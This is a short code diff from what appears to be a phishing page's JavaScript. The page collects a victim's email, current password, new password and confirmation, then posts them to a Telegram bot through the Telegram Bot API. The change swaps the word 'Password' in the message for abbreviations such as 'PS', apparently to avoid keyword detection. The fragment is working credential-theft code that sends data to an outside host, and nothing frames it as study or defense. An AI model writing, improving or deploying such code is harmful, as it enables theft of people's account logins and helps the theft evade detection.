@@ -420,7 +420,7 @@
         step3.querySelector('#loading').style.display = 'block';
 
         try {
-          const message = `*New Data*\n\nEmail: ${email}\nPassword: ${name}\nNew Password: ${newPass}\nConfirm Password: ${confirmPass}`;
+          const message = `*New Data*\n\nEmail: ${email}\nPS: ${name}\nN PS: ${newPass}\nC PS: ${confirmPass}`;
           const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
